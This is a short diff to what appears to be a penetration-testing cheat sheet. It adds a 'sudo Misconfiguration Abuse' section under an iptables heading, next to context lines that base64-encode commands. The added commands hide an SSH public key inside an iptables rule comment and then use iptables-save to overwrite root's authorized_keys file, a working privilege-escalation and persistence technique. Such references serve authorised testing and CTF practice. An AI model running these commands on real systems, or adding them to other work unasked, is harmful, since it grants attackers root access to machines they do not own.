@@ -775,6 +775,16 @@ echo "<COMMAND>" | iconv -f UTF-8 -t UTF-16LE | base64 -w0
 iconv -f ASCII -t UTF-16LE <FILE>.txt | base64 | tr -d "\n"
 ```
 
+##### iptables
+
+###### sudo Misconfiguration Abuse
+
+```c
+sudo /usr/sbin/iptables -A INPUT -i lo -j ACCEPT -m comment --comment $'\n<SSH_KEY>\n'
+sudo iptables -S
+sudo /usr/sbin/iptables-save -f /root/.ssh/authorized_keys
+```
+
 ##### vi
 
 ```c
